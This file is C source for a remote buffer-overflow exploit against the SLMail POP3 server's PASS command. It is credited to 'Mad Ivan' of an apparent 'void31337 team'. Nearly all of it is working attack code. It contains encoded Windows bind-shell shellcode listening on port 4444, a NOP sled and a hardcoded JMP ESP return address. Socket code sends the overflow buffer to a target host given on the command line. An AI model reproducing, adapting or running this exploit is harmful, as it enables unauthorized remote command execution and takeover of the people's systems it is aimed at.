/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = 
\"\\xfc\\x6a\\xeb\\x4d\\xe8\\xf9\\xff\\xff\\xff\\x60\\x8b\\x6c\\x24\\x24\\x8b\\x45\"
\"\\x3c\\x8b\\x7c\\x05\\x78\\x01\\xef\\x8b\\x4f\\x18\\x8b\\x5f\\x20\\x01\\xeb\\x49\"
\"\\x8b\\x34\\x8b\\x01\\xee\\x31\\xc0\\x99\\xac\\x84\\xc0\\x74\\x07\\xc1\\xca\\x0d\"
\"\\x01\\xc2\\xeb\\xf4\\x3b\\x54\\x24\\x28\\x75\\xe5\\x8b\\x5f\\x24\\x01\\xeb\\x66\"
\"\\x8b\\x0c\\x4b\\x8b\\x5f\\x1c\\x01\\xeb\\x03\\x2c\\x8b\\x89\\x6c\\x24\\x1c\\x61\"
\"\\xc3\\x31\\xdb\\x64\\x8b\\x43\\x30\\x8b\\x40\\x0c\\x8b\\x70\\x1c\\xad\\x8b\\x40\"
\"\\x08\\x5e\\x68\\x8e\\x4e\\x0e\\xec\\x50\\xff\\xd6\\x66\\x53\\x66\\x68\\x33\\x32\"
\"\\x68\\x77\\x73\\x32\\x5f\\x54\\xff\\xd0\\x68\\xcb\\xed\\xfc\\x3b\\x50\\xff\\xd6\"
\"\\x5f\\x89\\xe5\\x66\\x81\\xed\\x08\\x02\\x55\\x6a\\x02\\xff\\xd0\\x68\\xd9\\x09\"
\"\\xf5\\xad\\x57\\xff\\xd6\\x53\\x53\\x53\\x53\\x53\\x43\\x53\\x43\\x53\\xff\\xd0\"
\"\\x66\\x68\\x11\\x5c\\x66\\x53\\x89\\xe1\\x95\\x68\\xa4\\x1a\\x70\\xc7\\x57\\xff\"
\"\\xd6\\x6a\\x10\\x51\\x55\\xff\\xd0\\x68\\xa4\\xad\\x2e\\xe9\\x57\\xff\\xd6\\x53\"
\"\\x55\\xff\\xd0\\x68\\xe5\\x49\\x86\\x49\\x57\\xff\\xd6\\x50\\x54\\x54\\x55\\xff\"
\"\\xd0\\x93\\x68\\xe7\\x79\\xc6\\x79\\x57\\xff\\xd6\\x55\\xff\\xd0\\x66\\x6a\\x64\"
\"\\x66\\x68\\x63\\x6d\\x89\\xe5\\x6a\\x50\\x59\\x29\\xcc\\x89\\xe7\\x6a\\x44\\x89\"
\"\\xe2\\x31\\xc0\\xf3\\xaa\\xfe\\x42\\x2d\\xfe\\x42\\x2c\\x93\\x8d\\x7a\\x38\\xab\"
\"\\xab\\xab\\x68\\x72\\xfe\\xb3\\x16\\xff\\x75\\x44\\xff\\xd6\\x5b\\x57\\x52\\x51\"
\"\\x51\\x51\\x6a\\x01\\x51\\x51\\x55\\x51\\xff\\xd0\\x68\\xad\\xd9\\x05\\xce\\x53\"
\"\\xff\\xd6\\x6a\\xff\\xff\\x37\\xff\\xd0\\x8b\\x57\\xfc\\x83\\xc4\\x64\\xff\\xd6\"
\"\\x52\\xff\\xd0\\x68\\xf0\\x8a\\x04\\x5f\\x53\\xff\\xd6\\xff\\xd0\";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = \"USER madivan\\r\\n\";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\"
                       \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2608 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 317);
      *(long*)&evil[2600] = 0x7CB41010; // JMP ESP XP 7CB41020 FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf(\"[+] %s\", receive);
      // user
      printf(\"[+] Sending Username...\\n\");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf(\"[+] %s\", receive);
      // passwd
      printf(\"[+] Sending Evil buffer...\\n\");
      sprintf(buf, \"PASS %s\\r\\n\", evil);
      //test = fopen(\"test.txt\", \"w\");
      //fprintf(test, \"%s\", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf(\"[*] Done! Connect to the host on port 4444...\\n\\n\");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf(\"gethostbyname() error!\\n\"); exit(0);
    }
    printf(\"[+] Connecting to %s\\n\", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf(\"[-] socket blah?\\n\");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf(\"[-] connect() blah!\\n\");
        exit(0);
          }
    printf(\"[+] Connected to %s\\n\", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf(\"\\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\\n\");
    printf(\"[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\\n\\n\");
    if ( argc < 2 ) { printf(\"usage: slmail-ex.exe <host> \\n\\n\"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
